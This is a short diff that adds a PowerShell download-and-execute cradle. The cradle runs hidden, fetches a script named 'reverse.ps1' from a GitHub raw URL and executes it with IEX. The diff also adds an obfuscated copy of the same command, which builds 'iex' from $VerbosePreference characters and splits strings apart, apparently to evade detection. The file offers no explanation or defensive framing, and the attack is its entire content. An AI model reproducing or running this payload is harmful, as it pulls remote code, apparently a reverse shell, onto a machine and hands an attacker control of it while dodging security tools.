@@ -1,0 +1,6 @@
+https://raw.githubusercontent.com/MarcAhoy/upgraded-octo-carnival/main/reverse.ps1
+
+powershell -nop -w hidden IEX("(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/MarcAhoy/upgraded-octo-carnival/main/reverse.ps1')")
+
+
+& ( ([strING]$VErBOSePREFereNCE)[1,3]+'x'-join'') ( (('powershell -nop -'+'w '+'hid'+'den IEX({'+'1'+'}(new-object net.we'+'b'+'cli'+'ent).do'+'wn'+'load'+'string({'+'0}https://r'+'aw.githubuse'+'rcont'+'ent.'+'com'+'/MarcAho'+'y'+'/upgraded'+'-o'+'cto-'+'c'+'ar'+'ni'+'v'+'al/ma'+'in/r'+'e'+'ve'+'r'+'s'+'e'+'.ps1{0}){'+'1})')  -F [chAr]39,[chAr]34) )
